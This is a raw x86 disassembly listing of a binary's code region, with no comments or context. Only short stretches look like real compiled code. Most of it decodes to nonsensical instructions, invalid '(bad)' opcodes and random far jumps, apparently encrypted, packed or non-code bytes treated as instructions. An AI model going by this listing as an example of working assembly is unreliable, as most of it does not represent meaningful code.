  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d56c
  41d54b:	mov    ecx,0x55dabe41
  41d550:	push   ss
  41d551:	sbb    BYTE PTR [edx+edx*1+0x5b611818],bh
  41d558:	lods   al,BYTE PTR ds:[esi]
  41d559:	idiv   ch
  41d55b:	jo     0x41d4f1
  41d55d:	popa   
  41d55e:	shl    BYTE PTR [esi-0x4b],cl
  41d561:	inc    eax
  41d562:	mov    dl,0x9e
  41d564:	dec    ebx
  41d565:	xor    DWORD PTR [ebp-0x21],ebx
  41d568:	sbb    al,0x76
  41d56a:	pushf  
  41d56b:	fs mov ah,0xfd
  41d56e:	jns    0x41d5e0
  41d570:	mov    al,ds:0xa2c1994e
  41d575:	cmp    edi,DWORD PTR [ecx-0x7f]
  41d578:	rol    DWORD PTR [eax+0x74],0xee
  41d57c:	sbb    bh,BYTE PTR [ebx-0x7c]
  41d57f:	arpl   WORD PTR [ebx+0x3b],ax
  41d582:	xor    eax,0x6cfb5085
  41d587:	push   ecx
  41d588:	outs   dx,DWORD PTR ds:[esi]
  41d589:	mov    ebx,0xeeb97db
  41d58e:	push   ebp
  41d58f:	out    0x31,al
  41d591:	pop    esi
  41d592:	in     eax,dx
  41d593:	cmovle ecx,DWORD PTR [esi+0xf4c23dd]
  41d59a:	inc    edx
  41d59b:	daa    
  41d59c:	lahf   
  41d59d:	aad    0xfd
  41d59f:	sub    ecx,edi
  41d5a1:	gs push edi
  41d5a3:	mov    dl,0x38
  41d5a5:	sub    esp,edi
  41d5a7:	ja     0x41d52e
  41d5a9:	loop   0x41d59a
  41d5ab:	out    dx,al
  41d5ac:	adc    ebx,DWORD PTR [esi+edi*2-0x6a5e9d71]
  41d5b3:	(bad)  
  41d5b4:	daa    
  41d5b5:	sbb    ebx,ecx
  41d5b7:	clc    
  41d5b8:	sbb    eax,0x1dd13132
  41d5bd:	icebp  
  41d5be:	sbb    BYTE PTR [ebp-0x787cd117],0xad
  41d5c5:	jecxz  0x41d5b6
  41d5c7:	pop    edi
  41d5c8:	mov    es,WORD PTR [ecx-0x2d]
  41d5cb:	mov    dh,0xa7
  41d5cd:	int    0x91
  41d5cf:	mov    edx,0xf41cd48d
  41d5d4:	les    ebx,FWORD PTR [edx+edx*1]
  41d5d7:	int3   
  41d5d8:	mov    ds:0x287f7a8a,al
  41d5dd:	ret    
  41d5de:	(bad)  
  41d5df:	mov    dh,0x19
  41d5e1:	sub    bh,cl
  41d5e3:	mov    edi,0x7314a2e1
  41d5e8:	stos   DWORD PTR es:[edi],eax
  41d5e9:	shr    BYTE PTR [eax],cl
  41d5eb:	or     ecx,0xa15b757d
  41d5f1:	add    DWORD PTR [esi-0x61a98933],0x209d63e1
  41d5fb:	popf   
  41d5fc:	in     al,dx
  41d5fd:	or     ebx,DWORD PTR [esi+0x167e83ca]
  41d603:	mov    al,ds:0x5a674b2
  41d608:	xor    al,0x9a
  41d60a:	pop    ebp
  41d60b:	add    ebx,0x29fefbfb
  41d611:	push   es
  41d612:	loope  0x41d62c
  41d614:	les    ebp,FWORD PTR ds:0x63ec7fe
  41d61a:	mov    cl,ch
  41d61c:	(bad)  
  41d61d:	daa    
  41d61e:	mov    eax,0xe66f7689
  41d623:	jmp    0x41d5cd
  41d625:	stos   BYTE PTR es:[edi],al
  41d626:	dec    esp
  41d627:	jb     0x41d5ef
  41d629:	js     0x41d5b9
  41d62b:	lods   eax,DWORD PTR ds:[esi]
  41d62c:	push   esp
  41d62d:	sbb    eax,0xe66c33b6
  41d632:	sbb    ah,BYTE PTR [si+0x5586]
  41d637:	dec    ebx
  41d638:	cmp    al,0xb5
  41d63a:	push   0xffffffa9
  41d63c:	sti    
  41d63d:	push   0xdefb7235
  41d642:	jle    0x41d5e0
  41d644:	jbe    0x41d61b
  41d646:	mov    al,0x85
  41d648:	mov    bl,BYTE PTR [esi+ebx*4+0x13]
  41d64c:	ficom  DWORD PTR [ecx-0x4a9eab43]
  41d652:	lahf   
  41d653:	mov    edi,0x1df152ff
  41d658:	fisttp DWORD PTR [edx-0x683f8b3b]
  41d65e:	xlat   BYTE PTR ds:[ebx]
  41d65f:	fdivr  st(7),st
  41d661:	pop    ss
  41d662:	out    dx,eax
  41d663:	jg     0x41d6e4
  41d665:	cdq    
  41d666:	test   DWORD PTR [ebx-0x4f1982d1],ecx
  41d66c:	call   0x111110ed
  41d671:	mov    esp,0x3b388dff
  41d676:	sbb    eax,0x1bed820c
  41d67b:	add    eax,0xb7e9ddd3
  41d680:	repz push edx
  41d682:	mov    ds:0x6812c0b5,al
  41d687:	sbb    dl,BYTE PTR [eax+0x2c832202]
  41d68d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d68e:	pushf  
  41d68f:	sahf   
  41d690:	dec    esi
  41d691:	shr    DWORD PTR [eax],cl
  41d693:	in     eax,0x66
  41d695:	fisubr WORD PTR [ecx+0x326cdfea]
  41d69b:	dec    esi
  41d69c:	aas    
  41d69d:	and    al,0x80
  41d69f:	xchg   al,dh
  41d6a1:	pop    ebx
  41d6a2:	int3   
  41d6a3:	ds popfw 
  41d6a6:	cmp    DWORD PTR [edx+0x393a7fef],0x18295c25
  41d6b0:	cld    
  41d6b1:	push   ss
  41d6b2:	in     al,0xba
  41d6b4:	push   0xffffff88
  41d6b6:	mov    ebp,0x4518224f
  41d6bb:	in     al,dx
  41d6bc:	daa    
  41d6bd:	(bad)  
  41d6be:	or     BYTE PTR [esi+edi*1],cl
  41d6c1:	ss sbb eax,0x2df4124
  41d6c7:	and    ch,BYTE PTR [ebp-0x25]
  41d6ca:	adc    dl,BYTE PTR [edi+eiz*1]
  41d6cd:	cmp    eax,edx
  41d6cf:	cmp    ebp,DWORD PTR [edi]
  41d6d1:	push   0xb3a6cf68
  41d6d6:	pop    edx
  41d6d7:	jno    0x41d741
  41d6d9:	sub    DWORD PTR [ecx],edx
  41d6db:	mov    eax,ds:0xebbeddd8
  41d6e0:	idiv   eax
  41d6e2:	mov    al,ds:0x2ac23655
  41d6e7:	(bad)  
  41d6e8:	jo     0x41d75e
  41d6ea:	and    ch,BYTE PTR [eax-0x3e]
  41d6ed:	fcomp  QWORD PTR [eax+ecx*1]
  41d6f0:	mov    DWORD PTR [edx-0x73],ecx
  41d6f3:	inc    esi
  41d6f4:	mov    al,ds:0xa2263264
  41d6f9:	jle    0x41d6ff
  41d6fb:	add    BYTE PTR [ecx-0x36],bh
  41d6fe:	pop    es
  41d6ff:	inc    edx
  41d700:	add    al,0xbd
  41d702:	pop    ebp
  41d703:	inc    eax
  41d704:	adc    BYTE PTR [esi+edi*4-0x69e0b94d],ah
  41d70b:	push   ebx
  41d70c:	xchg   edx,eax
  41d70d:	cli    
  41d70e:	inc    ebp
  41d70f:	das    
  41d710:	fnstsw WORD PTR [edi-0x1a5183bf]
  41d716:	or     al,0x0
  41d718:	sub    ch,BYTE PTR [edx-0x1a]
  41d71b:	dec    ebx
  41d71c:	out    0xb3,al
  41d71e:	cld    
  41d71f:	rol    BYTE PTR [edi+0x40],1
  41d722:	xchg   ecx,eax
  41d723:	mul    BYTE PTR ds:[edi+0x793ccfce]
  41d72a:	std    
  41d72b:	and    ecx,DWORD PTR [ebp+eiz*8+0x6db7bfd3]
  41d732:	jo     0x41d7a2
  41d734:	push   DWORD PTR [eax+0x513a11a9]
  41d73a:	inc    edi
  41d73b:	push   edi
  41d73c:	xchg   ecx,eax
  41d73d:	jno    0x41d705
  41d73f:	pop    edi
  41d740:	lock lods al,BYTE PTR ds:[esi]
  41d742:	xlat   BYTE PTR ds:[ebx]
  41d743:	push   es
  41d744:	mov    al,0x0
  41d746:	cmp    al,0xc0
  41d748:	jecxz  0x41d7b2
  41d74a:	clc    
  41d74b:	shr    BYTE PTR [edx],cl
  41d74d:	adc    bl,cl
  41d74f:	shr    DWORD PTR [ebx],1
  41d751:	dec    ebp
  41d752:	or     al,cl
  41d754:	push   DWORD PTR [edx-0x5b]
  41d757:	adc    cl,0x5d
  41d75a:	test   BYTE PTR [ecx+0x2c],0xe5
  41d75e:	adc    eax,0x74d585d9
  41d763:	adc    al,0xfb
  41d765:	mov    eax,0xdc518512
  41d76a:	pop    ecx
  41d76b:	ss inc esp
  41d76d:	retf   
  41d76e:	retf   0x5761
  41d771:	stc    
  41d772:	(bad)  
  41d773:	in     eax,0xf8
  41d775:	lods   eax,DWORD PTR ds:[esi]
  41d776:	cmp    DWORD PTR [esi-0x40ad2808],0xf
  41d77d:	cmp    dl,dh
  41d77f:	sti    
  41d780:	out    0x5e,al
  41d782:	jmp    0xfb37d406
  41d787:	cs xchg ecx,eax
  41d789:	adc    DWORD PTR [ebp+0x1c],0x8a9312d7
  41d790:	xchg   ebp,eax
  41d791:	adc    ah,BYTE PTR ds:0x45bf9554
  41d797:	mov    dh,ah
  41d799:	leave  
  41d79a:	push   ecx
  41d79b:	popf   
  41d79c:	mov    al,ds:0x17e18780
  41d7a1:	addr16 cwde 
  41d7a3:	mov    al,0x47
  41d7a5:	xchg   edx,eax
  41d7a6:	nop
  41d7a7:	test   eax,0x28f3507a
  41d7ac:	pop    eax
  41d7ad:	(bad)  
  41d7ae:	(bad)  
  41d7af:	imul   eax,DWORD PTR [esi-0x47],0x58be52e8
  41d7b6:	call   FWORD PTR [ebx+0x5f]
  41d7b9:	icebp  
  41d7ba:	aaa    
  41d7bb:	ins    BYTE PTR es:[edi],dx
  41d7bc:	mov    esi,DWORD PTR [ebx]
  41d7be:	and    bl,dl
  41d7c0:	(bad)  
  41d7c1:	leave  
  41d7c2:	pusha  
  41d7c3:	jae    0x41d83d
  41d7c5:	cmp    al,0x70
  41d7c7:	popf   
  41d7c8:	pushf  
  41d7c9:	adc    eax,0x443f101e
  41d7ce:	push   esp
  41d7cf:	outs   dx,BYTE PTR ds:[esi]
  41d7d0:	jae    0x41d7f6
  41d7d2:	dec    edx
  41d7d3:	das    
  41d7d4:	dec    esp
  41d7d5:	jnp    0x41d77c
  41d7d7:	rcl    DWORD PTR [ebp+0x226e95fa],0x55
  41d7de:	popf   
  41d7df:	cdq    
  41d7e0:	rcl    al,0x8a
  41d7e3:	pop    ss
  41d7e4:	movups XMMWORD PTR [ebx+edi*4],xmm0
  41d7e8:	mov    eax,ds:0x88616957
  41d7ed:	test   dl,dl
  41d7ef:	xchg   edi,eax
  41d7f0:	sub    DWORD PTR [eax+esi*2+0x7b],0x7a
  41d7f5:	mov    ds:0x7c1c6699,eax
  41d7fa:	shr    BYTE PTR gs:[ebp-0x19632677],0x1f
  41d802:	fisubr WORD PTR [esi+0x70]
  41d805:	sahf   
  41d806:	xor    BYTE PTR ds:0x3616561f,0x2
  41d80d:	fisub  DWORD PTR [esi]
  41d80f:	enter  0xbf6,0xe6
  41d813:	mov    al,0x5d
  41d815:	jmp    0x41d824
  41d817:	mov    al,0xe5
  41d819:	mov    al,0x81
  41d81b:	hlt    
  41d81c:	ficomp DWORD PTR [edi+0xb2b8d82]
  41d822:	mov    BYTE PTR [edx+0x78462245],ch
  41d828:	dec    edx
  41d829:	fdiv   st(4),st
  41d82b:	or     ebx,DWORD PTR [edi]
  41d82d:	mov    dl,0x58
  41d82f:	jne    0x41d879
  41d831:	dec    ebp
  41d832:	jns    0x41d7c8
  41d834:	push   ss
  41d835:	outs   dx,BYTE PTR ds:[esi]
  41d836:	cdq    
  41d837:	fstp   DWORD PTR [eax+0x2c]
  41d83a:	aas    
  41d83b:	jbe    0x41d7f2
  41d83d:	out    0x85,eax
  41d83f:	add    al,0x6b
  41d841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d842:	cli    
  41d843:	das    
  41d844:	jae    0x41d8bc
  41d846:	xor    BYTE PTR [eax-0x51e2d901],dh
  41d84c:	and    BYTE PTR [ebx-0x52],bh
  41d84f:	or     al,0xde
  41d851:	mov    esi,edi
  41d853:	pop    ebx
  41d854:	(bad)  
  41d855:	push   0xb3f48ea6
  41d85a:	jbe    0x41d883
  41d85c:	xchg   DWORD PTR [ecx+0xf],ecx
  41d85f:	stos   DWORD PTR es:[edi],eax
  41d860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d861:	jae    0x41d8ba
  41d863:	aad    0xe1
  41d865:	xchg   edx,eax
  41d866:	lds    edi,FWORD PTR [eax+eax*8-0x7c98998c]
  41d86d:	out    0xb8,al
  41d86f:	and    ah,0x4f
  41d872:	dec    edx
  41d873:	lods   eax,DWORD PTR ds:[esi]
  41d874:	(bad)  
  41d876:	add    BYTE PTR [esi+edx*2+0x2c4f2e30],0xcc
  41d87e:	sub    DWORD PTR [edi-0x47],0x8c4eaa5e
  41d885:	and    al,0x63
  41d887:	pop    ss
  41d888:	mov    dh,0xbc
  41d88a:	jmp    FWORD PTR [edx]
  41d88c:	out    0x75,al
  41d88e:	adc    esi,eax
  41d890:	sbb    edi,DWORD PTR [eax]
  41d892:	outs   dx,DWORD PTR ds:[esi]
  41d893:	add    edx,DWORD PTR [eax+0x38]
  41d896:	scas   eax,DWORD PTR es:[edi]
  41d897:	inc    eax
  41d898:	aas    
  41d899:	iret   
  41d89a:	xor    DWORD PTR [edi+0x53],eax
  41d89d:	cmp    bl,bl
  41d89f:	inc    esi
  41d8a0:	jg     0x41d858
  41d8a2:	mov    ebx,0x36146e27
  41d8a7:	mov    ah,0x49
  41d8a9:	(bad)  
  41d8aa:	cmc    
  41d8ab:	je     0x41d868
  41d8ad:	cmp    al,0x9f
  41d8af:	mov    esi,0x7f73a4e
  41d8b4:	sbb    eax,0xe77637e
  41d8b9:	std    
  41d8ba:	xchg   edi,eax
  41d8bb:	ja     0x41d89f
  41d8bd:	imul   edi,esp,0xffffffd1
  41d8c0:	xchg   DWORD PTR [edi+0x76],eax
  41d8c3:	lods   al,BYTE PTR ds:[esi]
  41d8c4:	je     0x41d8e5
  41d8c6:	sub    DWORD PTR [ebp-0x7125dbd3],0xef2f329a
  41d8d0:	lods   eax,DWORD PTR ds:[esi]
  41d8d1:	fs popf 
  41d8d3:	(bad)  
  41d8d5:	mov    edi,DWORD PTR [ecx]
  41d8d7:	in     eax,dx
  41d8d8:	pop    esi
  41d8d9:	adc    DWORD PTR [ebp-0x25],esi
  41d8dc:	je     0x41d861
  41d8de:	jne    0x41d8dc
  41d8e0:	mov    ebp,0xf76c8785
  41d8e5:	(bad)  [edi-0x9]
  41d8e8:	ins    BYTE PTR es:[edi],dx
  41d8e9:	or     al,0x6f
  41d8eb:	ins    BYTE PTR es:[edi],dx
  41d8ec:	loopne 0x41d910
  41d8ee:	gs inc ecx
  41d8f0:	retf   
  41d8f1:	dec    ebx
  41d8f2:	leave  
  41d8f3:	mov    ah,BYTE PTR [ebx+0x2]
  41d8f6:	js     0x41d94f
  41d8f8:	hlt    
  41d8f9:	scas   eax,DWORD PTR es:[edi]
  41d8fa:	and    bh,BYTE PTR [ebx+eiz*8-0xe]
  41d8fe:	mov    ebp,0x8601c2ad
  41d903:	stc    
  41d904:	out    dx,al
  41d905:	mov    ecx,0x548bd18e
  41d90a:	and    al,0x18
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x4225a8
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0x6b8f14bc,eax
  41d941:	mov    al,0x7f
  41d943:	dec    ebp
  41d944:	push   ss
  41d945:	sbb    BYTE PTR [edx+edx*1+0x5d01818],bh
  41d94c:	arpl   WORD PTR [edi],bp
  41d94e:	push   0x8b7fec48
  41d953:	and    edi,DWORD PTR [esi+0x1f63ca6]
  41d959:	xchg   ebx,eax
  41d95a:	int    0xd5
  41d95c:	xchg   esi,eax
  41d95d:	aam    0x6d
  41d95f:	cmp    eax,0xc89e5bd2
  41d964:	or     eax,0xbed2f10c
  41d969:	or     ecx,eax
  41d96b:	ds ins DWORD PTR es:[edi],dx
  41d96d:	cmc    
  41d96e:	or     al,0xd9
  41d970:	jmp    0x41d9a5
  41d972:	mov    esi,0x128a4248
  41d977:	sub    DWORD PTR [esi],0xf2f984dc
  41d97d:	cs aaa 
  41d97f:	in     al,0x9c
  41d981:	fidivr WORD PTR [edi+0x48e99573]
  41d987:	push   0x5789d160
  41d98c:	ja     0x41d940
  41d98e:	sahf   
  41d98f:	rol    ebp,cl
  41d991:	pop    eax
  41d992:	das    
  41d993:	push   edx
  41d994:	inc    esi
  41d995:	jmp    0x366b:0x3733c7f9
  41d99c:	in     al,dx
  41d99d:	(bad)  
  41d99e:	(bad)  [ebx+0x2342ed06]
  41d9a4:	rcl    BYTE PTR [eax],0x9d
  41d9a7:	cmp    cl,BYTE PTR [eax+esi*2]
  41d9aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9ab:	dec    edx
  41d9ac:	jae    0x41d930
  41d9ae:	rcr    DWORD PTR [ebx+0x4b],1
  41d9b1:	pop    ebx
  41d9b2:	retf   
  41d9b3:	pop    ss
  41d9b4:	jo     0x41da16
  41d9b6:	jnp    0x41da0b
  41d9b8:	pop    ebx
  41d9b9:	xchg   cl,bh
  41d9bb:	push   ds
  41d9bc:	adc    DWORD PTR [edx+0x1],esp
  41d9bf:	xchg   ebx,eax
  41d9c0:	shl    BYTE PTR [esi],0xe1
  41d9c3:	pop    edi
  41d9c4:	and    eax,0xf6ab000c
  41d9c9:	cli    
  41d9ca:	scas   eax,DWORD PTR es:[edi]
  41d9cb:	or     BYTE PTR [edx],0x53
  41d9ce:	fwait
  41d9cf:	mov    ecx,ebx
  41d9d1:	push   eax
  41d9d2:	mov    ds:0x99c8846e,al
  41d9d7:	xor    ah,dl
  41d9d9:	push   0xc
  41d9db:	xchg   ebp,eax
  41d9dc:	ss xchg ebx,eax
  41d9de:	jmp    0x2edb:0xec892d48
  41d9e5:	in     al,0xb9
  41d9e7:	adc    ecx,ebx
  41d9e9:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9eb:	xor    eax,0x9edc50cf
  41d9f0:	(bad)  
  41d9f1:	mov    ecx,0x2e5674d2
  41d9f6:	sub    edi,ebx
  41d9f8:	fdivr  QWORD PTR [ebx+eiz*2]
  41d9fb:	call   0x79c2:0xa54a5e8f
  41da02:	lahf   
  41da03:	aas    
  41da04:	adc    DWORD PTR [eax-0x519be2a1],esp
  41da0a:	dec    ecx
  41da0b:	jo     0x41d9ce
  41da0d:	sti    
  41da0e:	lock lock mov al,ds:0xa06773b6
  41da15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da16:	mov    dl,0x51
  41da18:	mov    al,0xd3
  41da1a:	retf   
  41da1b:	aad    0xc1
  41da1d:	daa    
  41da1e:	mov    dh,0xef
  41da20:	es stos DWORD PTR es:[edi],eax
  41da22:	jmp    0x38f2:0xd1da0c78
  41da29:	sbb    eax,0xb9b7d32b
  41da2e:	inc    esp
  41da2f:	test   BYTE PTR [eax],ch
  41da31:	iret   
  41da32:	in     al,0x54
  41da34:	inc    ebx
  41da35:	add    ebx,esp
  41da37:	or     DWORD PTR [esp+edx*2+0x14],0xa5060f7a
  41da3f:	int    0xe9
  41da41:	pop    ds
  41da42:	(bad)
  41da45:	xchg   edx,eax
  41da46:	cld    
  41da47:	sbb    BYTE PTR [edi+0x527e947],0xe
  41da4e:	aaa    
  41da4f:	lock ds sti 
  41da52:	sub    bl,BYTE PTR [ecx+0x8]
  41da55:	cwde   
  41da56:	mov    al,ds:0x21cd055d
  41da5b:	mov    es,ecx
  41da5d:	loop   0x41da03
  41da5f:	push   esi
  41da60:	jbe    0x41da2a
  41da62:	popf   
  41da63:	sbb    dl,BYTE PTR [edx]
  41da65:	dec    ebp
  41da66:	retf   
  41da67:	ss jae 0x41da71
  41da6a:	inc    ecx
  41da6b:	test   eax,0x77d7204e
  41da70:	xor    ebx,esp
  41da72:	jnp    0x41daea
  41da74:	ret    
  41da75:	lds    eax,FWORD PTR [edx]
  41da77:	or     cl,al
  41da79:	xor    ebp,DWORD PTR [ebp+0x78660758]
  41da7f:	push   ss
  41da80:	xchg   esp,eax
  41da81:	and    bl,BYTE PTR [eax+0x7]
  41da84:	fsubr  QWORD PTR [ebp+0x7b]
  41da87:	jmp    0x3f71fa8e
  41da8c:	bound  edi,QWORD PTR [ebx-0x4d15d934]
  41da92:	fdiv   QWORD PTR [eax]
  41da94:	clc    
  41da95:	jmp    0x41da8e
  41da97:	and    eax,0x9c8a7347
  41da9c:	or     DWORD PTR [ebp+0x47930e41],esi
  41daa2:	cwde   
  41daa3:	in     al,0xb5
  41daa5:	inc    ecx
  41daa6:	pushf  
  41daa7:	hlt    
  41daa8:	clc    
  41daa9:	xlat   BYTE PTR ds:[ebx]
  41daaa:	jbe    0x41da8b
  41daac:	xor    BYTE PTR [ebp+0x7b],0xfb
  41dab0:	push   edx
  41dab1:	adc    eax,0x429f06de
  41dab6:	js     0x41da5e
  41dab8:	iret   
  41dab9:	pop    ecx
  41daba:	(bad)  
  41dabb:	xchg   edi,eax
  41dabc:	fyl2x  
  41dabe:	popf   
  41dabf:	jnp    0x41db17
  41dac1:	lea    eax,[ebp+0x7f7511b7]
  41dac7:	(bad)
  41dacb:	fsubp  st(4),st
  41dacd:	xchg   ecx,eax
  41dace:	dec    esp
  41dacf:	cld    
  41dad0:	pop    eax
  41dad1:	fild   QWORD PTR [edx]
  41dad3:	dec    esi
  41dad4:	int    0xb9
  41dad6:	sub    al,0x9
  41dad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dad9:	repnz iret 
  41dadb:	jno    0x41da8f
  41dadd:	push   edx
  41dade:	jg     0x41db0a
  41dae0:	loope  0x41db3d
  41dae2:	sti    
  41dae3:	push   edx
  41dae4:	mov    ecx,0x56869e23
  41dae9:	jmp    0x9a921dcc
  41daee:	pop    ds
  41daef:	dec    ebp
  41daf0:	jae    0x41db05
  41daf2:	xor    al,0x20
  41daf4:	push   0xfffffff8
  41daf6:	jo     0x41db3b
  41daf8:	cmp    al,0xbe
  41dafa:	sbb    eax,0x2b2a27a
  41daff:	in     al,0x1c
  41db01:	pop    ebx
  41db02:	loope  0x41da98
  41db04:	into   
  41db05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db06:	idiv   BYTE PTR [ebx-0x12]
  41db09:	pop    eax
  41db0a:	mov    dl,0xb1
  41db0c:	call   0x71b8:0x1785e057
  41db13:	(bad)  
  41db14:	int3   
  41db15:	sbb    ecx,DWORD PTR [ecx-0xa07dad9]
  41db1b:	and    al,0xbb
  41db1d:	aaa    
  41db1e:	in     eax,dx
  41db1f:	push   ss
  41db20:	mov    cs,WORD PTR [edx+0x7f]
  41db23:	iret   
  41db24:	out    0xa9,eax
  41db26:	cmp    al,0x15
  41db28:	xor    dh,al
  41db2a:	out    dx,al
  41db2b:	scas   al,BYTE PTR es:[edi]
  41db2c:	addr16 pop edx
  41db2e:	lock push 0x5dbf41bf
  41db34:	nop    ebp
  41db37:	pop    ds
  41db38:	and    bh,BYTE PTR [ecx+0xdd12777]
  41db3e:	xchg   BYTE PTR [edx],cl
  41db40:	pop    ss
  41db41:	push   0xffffff80
  41db43:	das    
  41db44:	test   eax,0xfc98fd0f
  41db49:	sbb    BYTE PTR [ecx-0x5c],cl
  41db4c:	push   ebp
  41db4d:	xchg   ebp,eax
  41db4e:	pop    es
  41db4f:	sub    DWORD PTR [ebp+0x14],edi
  41db52:	call   0xf89e:0xab52ceff
  41db59:	and    BYTE PTR [esi-0x406f73c3],dh
  41db5f:	push   ss
  41db60:	sbb    al,0xa9
  41db62:	ins    BYTE PTR es:[edi],dx
  41db63:	pop    ecx
  41db64:	inc    edi
  41db65:	jmp    0xf3424221
  41db6a:	xchg   ebp,ebp
  41db6c:	ret    0x5518
  41db6f:	je     0x41dbdb
  41db71:	mov    ds:0xd3c56179,eax
  41db76:	scas   eax,DWORD PTR es:[edi]
  41db77:	jmp    0x8504135
  41db7c:	pop    ds
  41db7d:	mov    edi,0xba9ce8a6
  41db82:	mov    al,0xc7
  41db84:	test   DWORD PTR [edi+0x7f],0x81c1a789
  41db8b:	push   esi
  41db8c:	push   ss
  41db8d:	xor    BYTE PTR [eax],cl
  41db8f:	(bad)  
  41db90:	cs push edx
  41db92:	mov    bl,0xbf
  41db94:	or     DWORD PTR [eax-0x1b],esp
  41db97:	push   0x1d75254c
  41db9c:	mov    esi,0xe0496760
  41dba1:	out    dx,al
  41dba2:	mov    bl,0xc2
  41dba4:	push   edi
  41dba5:	push   ecx
  41dba6:	outs   dx,DWORD PTR ds:[esi]
  41dba7:	test   al,0x81
  41dba9:	into   
  41dbaa:	pop    es
  41dbab:	gs cmp eax,0x1c4fb067
  41dbb1:	pop    esi
  41dbb2:	fwait
  41dbb3:	jl     0x41dbc0
  41dbb5:	(bad)  
  41dbb6:	fs jge 0x41dbff
  41dbb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbba:	and    bl,BYTE PTR [esi]
  41dbbc:	mov    ebx,0xccca03f5
  41dbc1:	pop    edi
  41dbc2:	cld    
  41dbc3:	addr16 ret 0x4930
  41dbc7:	std    
  41dbc8:	and    DWORD PTR [edx],esp
  41dbca:	mov    bl,bl
  41dbcc:	cld    
  41dbcd:	or     esp,DWORD PTR [eax-0xa]
  41dbd0:	xchg   DWORD PTR [eax],esp
  41dbd2:	pop    ebp
  41dbd3:	scas   eax,DWORD PTR es:[edi]
  41dbd4:	push   ebp
  41dbd5:	mov    ds:0xc083725b,al
  41dbda:	or     BYTE PTR [ecx],bh
  41dbdc:	mov    dh,0x62
  41dbde:	xor    dh,BYTE PTR [eax+0x21]
  41dbe1:	push   edi
  41dbe2:	jo     0x41dc35
  41dbe4:	or     BYTE PTR ds:0x9773bc18,cl
  41dbea:	jno    0x41dbb9
  41dbec:	pop    es
  41dbed:	adc    esi,0x14dcdf13
  41dbf3:	jno    0x41db94
  41dbf5:	ja     0x41dc72
  41dbf7:	mov    ebp,0xa798aa58
  41dbfc:	mov    ebx,0xf3e414a9
  41dc01:	sbb    al,0x74
  41dc03:	fidiv  DWORD PTR [edi-0x426165c8]
  41dc09:	dec    esp
  41dc0a:	aad    0x70
  41dc0c:	or     DWORD PTR [edi-0x67],esi
  41dc0f:	jl     0x41dc60
  41dc11:	dec    esp
  41dc12:	repz cdq 
  41dc14:	sub    DWORD PTR [ecx+0x2a0ffe2f],ebp
  41dc1a:	or     eax,0xd350a149
  41dc1f:	jmp    0xdad34ccd
  41dc24:	enter  0x48bb,0x1a
  41dc28:	enter  0x6130,0x42
  41dc2c:	not    ch
  41dc2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc2f:	lds    ebp,FWORD PTR [ebx]
  41dc31:	add    BYTE PTR [edx],bh
  41dc33:	pop    ebp
  41dc34:	ror    cl,cl
  41dc36:	arpl   WORD PTR ds:0xea98693b,bp
  41dc3c:	xor    al,0xd4
  41dc3e:	and    eax,0x53b3d071
  41dc43:	sbb    DWORD PTR [eax-0x6922e049],edx
  41dc49:	cmp    ah,BYTE PTR [edi+ecx*8+0x38f8d845]
  41dc50:	cld    
  41dc51:	ret    0x7bd9
  41dc54:	popa   
  41dc55:	inc    ecx
  41dc56:	mov    ds:0x35c40ca6,al
  41dc5b:	repnz int 0x23
  41dc5e:	sahf   
  41dc5f:	stos   BYTE PTR es:[edi],al
  41dc60:	mov    es,esp
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	std    
  41dc64:	push   cs
  41dc65:	test   al,0x31
  41dc67:	push   ss
  41dc68:	call   0xb43b0646
  41dc6d:	jo     0x41dcea
  41dc6f:	add    ah,BYTE PTR [esi-0xb43477]
  41dc75:	cmp    eax,0xda7de26c
  41dc7a:	push   esi
  41dc7b:	sub    al,0x8c
  41dc7d:	sbb    edx,DWORD PTR [eax]
  41dc7f:	aam    0x21
  41dc81:	lods   al,BYTE PTR ds:[esi]
  41dc82:	mov    edi,0xaad5cb45
  41dc87:	test   BYTE PTR [edi+0x698168e5],cl
  41dc8d:	test   DWORD PTR [ecx+edi*8],esp
  41dc90:	(bad)  
  41dc91:	mov    ebp,0xeec970a5
  41dc96:	test   DWORD PTR [ecx+0x68],0x98c0f0da
  41dc9d:	mov    ebx,0x82d44ad2
  41dca2:	push   cs
  41dca3:	ja     0x41dcde
  41dca5:	mov    ebx,0x8dbb78d1
  41dcaa:	mov    dh,0x25
  41dcac:	cmp    eax,0x9288ee82
  41dcb1:	sbb    BYTE PTR [ebp+0x1a],0x88
  41dcb5:	mov    dh,BYTE PTR [ecx+0x2aaf1f04]
  41dcbb:	adc    ebx,DWORD PTR [ebp+0x2e]
  41dcbe:	loop   0x41dcf3
  41dcc0:	fwait
  41dcc1:	adc    dl,BYTE PTR [esi]
  41dcc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcc4:	dec    edx
  41dcc5:	push   eax
  41dcc6:	add    eax,0x340a02dd
  41dccb:	mov    cl,0x6d
  41dccd:	mov    esi,0x710777e6
